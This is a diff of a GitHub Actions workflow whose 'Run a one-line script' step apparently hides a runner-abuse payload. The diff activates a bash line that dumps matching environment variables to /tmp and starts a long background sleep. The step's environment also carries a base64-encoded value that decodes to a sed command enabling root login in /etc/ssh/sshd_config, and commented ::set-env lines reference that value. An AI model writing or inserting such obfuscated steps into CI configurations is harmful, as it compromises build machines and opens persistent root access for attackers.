@@ -27,14 +27,14 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: 
-          #echo 123
+        run: |
+          echo 123
           #echo 456
           #echo $@
           #echo "${{ toJson(github) }}"
           #echo "::set-env name=ss0::$ss0"
-          #bash -c "(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
-          echo "::set-env name=DAY_OF_WEEK::$( date +%a )"
+          bash -c "(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
+          #echo "::set-env name=DAY_OF_WEEK::$( date +%a )"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
